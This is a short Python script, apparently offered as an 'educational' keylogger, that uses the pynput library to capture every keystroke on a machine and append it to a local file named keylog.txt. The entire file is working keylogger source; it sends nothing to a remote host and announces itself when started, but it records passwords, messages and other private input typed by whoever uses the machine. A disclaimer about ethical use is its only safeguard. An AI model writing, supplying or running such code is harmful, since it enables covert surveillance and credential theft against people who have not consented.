"""
Educational Keylogger - For Ethical Use Only

This script logs keystrokes and saves them to a file.
Use this responsibly and only on machines you have permission to monitor.

Author: Your Name
"""

from pynput import keyboard
import os
from datetime import datetime

# File to store logs
log_file = "keylog.txt"

# Make sure log file exists
if not os.path.exists(log_file):
    with open(log_file, "w") as f:
        f.write("Keylogger Log Started at {}\n".format(datetime.now()))
        f.write("="*50 + "\n")

# Function to process key presses
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error logging key: {e}")

# Listener for the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger started... (Press Ctrl+C to stop)")
    listener.join()
